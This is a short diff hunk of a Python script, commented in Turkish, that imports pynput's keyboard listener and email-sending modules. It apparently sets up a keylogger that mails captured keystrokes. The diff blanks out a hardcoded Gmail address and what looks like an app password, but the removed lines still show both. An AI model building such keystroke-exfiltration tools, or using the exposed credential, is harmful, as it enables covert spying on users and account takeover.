@@ -4,9 +4,9 @@ from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
 
 # E-posta ayarları
-from_email = "kayra.dalcik@gmail.com"  # Kendi e-posta adresini yaz
-to_email = "kayra.dalcik@gmail.com"    # Hedef e-posta adresini yaz
-password = "lygz xomo hhju oilf"  # Gmail şifreni buraya yaz
+from_email = ""  # Kendi e-posta adresini yaz
+to_email = ""    # Hedef e-posta adresini yaz
+password = ""  # Gmail şifreni buraya yaz
 
 def email_gonder(message):
     try:
